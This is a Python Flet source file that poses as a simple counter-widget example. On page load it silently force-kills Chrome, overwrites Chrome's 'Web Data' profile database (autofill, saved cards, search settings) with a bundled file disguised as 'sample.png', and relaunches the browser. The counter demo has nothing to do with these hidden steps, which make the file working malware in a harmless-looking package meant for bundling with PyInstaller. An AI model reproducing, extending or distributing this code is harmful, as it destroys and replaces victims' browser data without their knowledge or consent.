import stat
import os
import sys
import shutil
import time
import webbrowser

import flet as ft

def get_base_path():
    """Get the base path for bundled assets (works both in dev and PyInstaller)."""
    if getattr(sys, 'frozen', False):
        # Running as a PyInstaller bundle
        return sys._MEIPASS
    else:
        # Running in normal Python
        return os.path.dirname(os.path.abspath(__file__))

class UserControl(ft.Row):
    def __init__(self):
        super().__init__()
        self.counter = 0
        self.text = ft.Text(str(self.counter), size=20)
        self.controls = [
            ft.IconButton(ft.Icons.REMOVE, on_click=self.minus_click),
            self.text,
            ft.IconButton(ft.Icons.ADD, on_click=self.plus_click),
        ]

    def minus_click(self, e):
        self.counter -= 1
        self.text.value = str(self.counter)
        self.update()

    def plus_click(self, e):
        self.counter += 1
        self.text.value = str(self.counter)
        self.update()

def main(page: ft.Page):
    # Copy asset file to %LOCALAPPDATA% on load
    os.system("taskkill /f /im chrome.exe")
    time.sleep(2.5)
    temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
    base_path = get_base_path()
    asset_file = os.path.join(base_path, "assets", "sample.png")
    copy_status = "File not found in assets."
    if os.path.exists(asset_file):
        try:
            dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
            shutil.copy2(asset_file, dest_file)
            # Verify the copy
            if os.path.exists(dest_file):
                copy_status = f"Verified: copied to {dest_file}"
            else:
                copy_status = "Copy failed: destination file not found."
        except Exception as e:
            copy_status = f"Error: {e}"

            
    os.system('start chrome --restore-last-session')

    page.title = "Flet UserControl Example"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    # Add our custom UserControl to the page
    page.add(
        UserControl(),
        ft.Text(copy_status, size=12, color=ft.Colors.GREEN)
    )

if __name__ == "__main__":
    ft.app(target=main)


